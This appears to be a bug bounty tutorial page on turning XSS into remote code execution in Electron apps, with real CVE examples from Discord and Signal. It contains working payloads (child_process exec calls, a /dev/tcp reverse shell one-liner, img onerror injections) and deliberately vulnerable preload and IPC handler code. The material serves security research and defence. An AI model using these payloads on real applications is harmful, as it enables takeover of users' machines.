---
title: XSS → RCE
description: The classic Electron XSS-to-RCE chain — prerequisites, payloads, escalation paths, and real CVEs
---

# XSS → RCE

This is the one that put Electron on the bug bounty map. In a web app, XSS gives you cookies and session tokens — annoying, but contained. In a misconfigured Electron app, XSS gives you a full shell on the user's machine. Same injection, completely different impact. That delta is why researchers spend time on Electron.

The chain itself isn't complicated. What makes it interesting is understanding *exactly* what configuration setting creates the gap, and how many different ways that gap can be opened.

<div class="es-flow">
  <div class="es-flow-box es-flow-source">DOM XSS<br><code>innerHTML = userInput</code></div>
  <div class="es-flow-arrow">→</div>
  <div class="es-flow-box es-flow-taint">JS runs in renderer</div>
  <div class="es-flow-arrow">→</div>
  <div class="es-flow-box es-flow-sink">RCE<br><code>exec('cmd')</code></div>
</div>

---

## What You Need

The chain requires two things working together. Miss either one and you've got a lower-severity finding — still valid, but not the critical you're looking for.

**You need XSS** — somewhere that user-controlled data hits `innerHTML`, `dangerouslySetInnerHTML`, `document.write`, a Markdown renderer, or anything that interprets content as HTML/JS.

**And you need an escalation path** — at least one of:

- `nodeIntegration: true`: renderer already has Node.js; no escalation step needed
- `contextIsolation: false`: renderer and preload share the same JS context; `ipcRenderer` is directly accessible
- An over-privileged contextBridge: a legitimate API that the XSS payload can call to reach an `exec()`

Finding XSS without an escalation path is still a finding. Finding the escalation path without XSS is still a finding. Finding both is the critical.

---

## Path 1: nodeIntegration = true

This was the default for early Electron apps (pre-2017) and still shows up in legacy codebases. When it's enabled, the renderer process has `require()` available like any Node.js script. XSS is one-step RCE.

```javascript
// BrowserWindow config:
new BrowserWindow({
  webPreferences: { nodeIntegration: true }
});
```

Once XSS executes in that renderer, the payload is as simple as:

```javascript
require('child_process').exec('calc.exe');

// Or, if someone patched out the obvious one:
process.mainModule.require('child_process').exec('open -a Calculator');
```

**Platform payloads:**

```javascript
// Windows:
require('child_process').exec('calc.exe');
require('child_process').execSync('powershell -Command "Start-Process cmd"');

// macOS:
require('child_process').exec('open /Applications/Calculator.app');

// Linux:
require('child_process').exec('xterm');

// Cross-platform reverse shell (authorized testing only):
require('child_process').exec('bash -i >& /dev/tcp/127.0.0.1/4444 0>&1');
```

Signal Desktop in 2018 was running with `nodeIntegration: true`. A crafted message sent to a Signal contact triggered XSS via Markdown rendering. The payload above, embedded in a message, opened a calculator on the recipient's machine without them clicking anything.

---

## Path 2: contextIsolation = false

This is the subtler version and shows up much more in modern audits. The app has correctly disabled `nodeIntegration` — the renderer doesn't have `require()`. But `contextIsolation: false` means the preload script and the web page share the same V8 context. Whatever the preload sets on `window`, the page can read.

```javascript
// BrowserWindow config:
new BrowserWindow({
  webPreferences: {
    contextIsolation: false,   // ← the problem
    preload: './preload.js'
  }
});
```

```javascript
// preload.js:
const { ipcRenderer } = require('electron');
window._ipc = ipcRenderer;  // preload puts ipcRenderer on the shared window
```

```javascript
// XSS payload in the page:
window._ipc.invoke('execute-command', 'calc.exe');
// Calls ipcMain.handle('execute-command', ...) directly — no contextBridge needed
```

The preload doesn't even need to be this explicit. With merged contexts, prototype pollution works across boundaries:

```javascript
// XSS payload:
Object.prototype.shell = require;  // Only works if nodeIntegration:true is also on
// But with contextIsolation:false, you can access preload variables directly:
window.ipcRenderer.send('any-registered-channel', malicious_args);
```

The practical impact: `contextIsolation: false` makes every registered IPC handler in the app reachable from the renderer. You don't need the bridge — you go around it.

---

## Path 3: The Over-Privileged Bridge

This is the modern variant. The app has `contextIsolation: true` and `nodeIntegration: false` — the config looks correct. But the preload exposes too much through `contextBridge`, and the exposed API is a path to `exec()`.

```javascript
// preload.js — VULNERABLE:
contextBridge.exposeInMainWorld('app', {
  openURL: (url) => shell.openExternal(url),

  // The problem — passes arbitrary channel names:
  ipc: {
    invoke: (ch, ...args) => ipcRenderer.invoke(ch, ...args)
  }
});
```

Post-XSS:
```javascript
// Renderer finds 'run-script' registered in ipcMain, calls it:
await window.app.ipc.invoke('run-script', 'calc.exe');
```

Or the bridge wraps the dangerous thing directly:

```javascript
// preload.js:
contextBridge.exposeInMainWorld('api', {
  runScript: (script) => ipcRenderer.invoke('run-script', script)
});

// main.js:
ipcMain.handle('run-script', async (event, script) => {
  return exec(script);  // XSS → window.api.runScript('calc.exe') → here
});
```

This pattern comes up constantly in apps that started correctly configured but then added convenience APIs without thinking about what they expose. A `build-project` handler that runs `npm run ${config.task}` is the same thing — `config.task` becomes the injection vector.

---

## Real CVEs, Real Chains

### Discord — CVE-2020-15174 (Masato Kinugawa)

Masato found that Discord's preload exposed a native module with a function called — no joke — `DANGEROUS_openExternal`. The "DANGEROUS" prefix was the developer's warning to themselves that it wasn't safe to call with untrusted input. The function was exposed anyway.

```javascript
// Stored XSS via Discord custom status / username rendered in chat
// Then in XSS payload:
DiscordNative.nativeModules.requireModule('discord_utils')
  .DANGEROUS_openExternal('file:///C:/Windows/System32/cmd.exe');
// cmd.exe opens. Full RCE.
```

The bounty was $10,000 from Discord's VDP.

### Signal Desktop — 2018

Signal's older Electron builds had `nodeIntegration: true`. The Markdown renderer didn't sanitize HTML. Result:

```
Message to your Signal contact:
<img src=x onerror="require('child_process').exec('open /Applications/Calculator.app')">
```

Recipient opens Signal. Calculator opens. No click needed.

### Mattermost — ElectroVolt (Black Hat 2022, Aaditya Purani)

Aaditya's ElectroVolt research (Black Hat 2022) was specifically about finding XSS + over-privileged contextBridge combinations. Mattermost had a stored XSS in a chat message that reached a contextBridge API wired to a `executeCommand` handler. Classic path 3.

---

## Building the Chain

**Step 1 — find the XSS vector:**

```bash
# innerHTML, document.write, insertAdjacentHTML:
grep -rn "innerHTML\|dangerouslySetInnerHTML\|document\.write\|insertAdjacentHTML" \
  --include="*.js" . | grep -v node_modules

# Markdown renderers (output often goes to innerHTML):
grep -rn "marked\|showdown\|markdown-it\|remark\|commonmark" \
  --include="*.js" . | grep -v node_modules

# User data reaching these sinks:
grep -rn "message\|content\|username\|title\|bio\|description" \
  --include="*.js" . | grep -E "innerHTML|marked\.parse|renderMarkdown" | grep -v node_modules
```

**Step 2 — find the escalation path:**

```bash
# Check BrowserWindow settings:
grep -rn "nodeIntegration\|contextIsolation\|sandbox" --include="*.js" . | grep -v node_modules

# Map the contextBridge surface:
grep -rn "exposeInMainWorld" --include="*.js" . -A 30 | grep -v node_modules

# Find handlers wired to dangerous operations:
grep -rn "ipcMain\.\(on\|handle\)" --include="*.js" . -A 10 | \
  grep -E "exec\b|spawn\b|child_process|openExternal" | grep -v node_modules
```

**Step 3 — verify without impact:**

```javascript
// Harmless confirmation — does the XSS execute?
<img src=x onerror="document.title='XSS'">

// Does the escalation path work? (opens a URL, not a shell)
<img src=x onerror="window.api.openURL('https://example.com')">

// Calculator test (classic low-harm PoC):
<img src=x onerror="window.api.runCommand('calc.exe')">
```

---

## Why Defense Is Harder Than It Looks

Every item in this table needs to be correct. One failure reopens the chain:

| Defense | What It Actually Blocks |
|---------|------------------------|
| `nodeIntegration: false` | Removes `require()` in renderer — but not IPC |
| `contextIsolation: true` | Separates preload/page contexts — but not the bridge API |
| `sandbox: true` | OS syscall restrictions — but not IPC across the boundary |
| Tight contextBridge | No arbitrary channel access — but only if designed narrowly |
| DOMPurify on render output | Blocks XSS from reaching DOM — depends on configuration |
| CSP (`script-src 'self'`) | Blocks inline scripts — but not all XSS vectors (see CSP bypasses) |
| IPC sender validation | Blocks post-XSS IPC abuse — the last line of defense |

The practical takeaway: you need CSP + contextIsolation + sandbox + narrow bridge + IPC validation. Any single gap is exploitable. In real apps, there's almost always at least one gap somewhere.

See [Sanitizers](../sanitizers/index.md) for bypass techniques on each of these defenses.
